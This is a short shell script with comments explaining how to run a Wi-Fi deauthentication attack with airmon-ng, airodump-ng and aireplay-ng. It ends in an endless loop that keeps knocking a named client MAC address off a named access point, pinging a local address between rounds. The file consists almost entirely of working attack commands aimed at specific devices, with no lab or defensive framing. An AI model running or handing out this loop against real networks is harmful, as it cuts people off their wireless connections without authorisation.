#First turn your wireless card into monitor mode:
# airmon-ng start wlan0

#Then scan the air for wireless AP's and clients
# airodump-ng mon0

#When you found a an access point that has a client connected, you can filter your scan. This also sets the interface to operate #on that particular channel for injecting packets:
# airodump-ng --channel 9 -b aa:aa:aa:aa:aa:aa mon0

#And finally, the injection of death frames
#aireplay-ng -a aa:aa:aa:aa:aa:aa -c bb:bb:bb:bb:bb:bb --deauth 1 mon0

#'-a' represents the MAC address of the target access point
#'-c' represents the MAC address of the target host
while true
do
   echo "aireplay..."
   sudo aireplay-ng -a 00:1F:9F:BB:AE:B9 -c 68:5D:43:82:AF:05 --deauth 1 mon0
   echo "ping..."
   ping -c 3 192.168.1.83
   echo "sleep 5..."
   sleep 5s
done
